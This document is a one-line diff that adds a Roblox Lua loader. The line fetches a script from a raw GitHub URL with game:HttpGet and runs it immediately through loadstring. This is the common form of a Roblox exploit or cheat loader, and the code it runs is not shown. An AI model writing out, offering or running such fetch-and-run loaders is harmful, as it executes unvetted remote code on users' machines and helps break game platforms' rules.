@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Emagey/ssp/refs/heads/main/script'), true)
